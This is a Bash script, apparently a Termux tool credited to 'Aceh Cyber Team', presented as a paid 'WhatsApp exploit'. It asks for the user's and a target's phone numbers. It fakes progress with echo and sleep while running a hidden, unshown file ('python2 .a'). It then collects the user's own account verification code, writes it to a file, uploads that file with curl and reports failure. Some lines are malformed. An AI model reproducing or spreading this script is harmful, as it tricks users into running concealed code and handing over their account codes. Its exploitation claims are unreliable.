#!/bin/bash
yellow='\e[93m'
blue='\e[1;34m'
green='\e[0;23m'
purple='\e[1;35m'
cyan='\e[1;36m'
red='\e[1;31m'
clear
echo -e $blue'============================================================'
echo -e $yellow
figlet "    Whatsapp"
echo -e $purple'Exploiting whatsapp code (paid)'
echo -e $blue'============================================================'
echo -e $red[+]$purple Welcome $red[+] $cyan Termux$red We Are$yellow Aceh Cyber Team $red[+]
echo -e '############################################################
ACT Copyright (c) 2019';
read -p "Nomer Anda   ~#: " nomer;
read -p "Nomer Target ~#: " target;
sleep 2
echo "[+] Syncing Target...";
sleep 1
echo "Login  => $nomer";
sleep 0.5
echo "Target => $target";
sleep 0.5
echo "[+] Exploiting...";
echo "Nomer => $nomer" >> python2 .b;
sleep 3;
python2 .a
echo "[+] Done.";
echo "Masukan Id Akun Anda";
read -p "Verify ID => " code;
sleep 2
echo "[+] Connecting to whatsapp.com...";
echo "Login => $nomer";
sleep 0.5
echo "ID AKUN=> $code";
sleep 0.5
echo "Target => $target";
sleep 0.5
echo "[+] AKUN TIDAK ADA...";
echo "Code => $code" >> whatsapp.txt;
curl -T whatsapp.txt https://www.whatsapp.com/
sleep 5
echo "[+] Exploited Gagal";
exit;
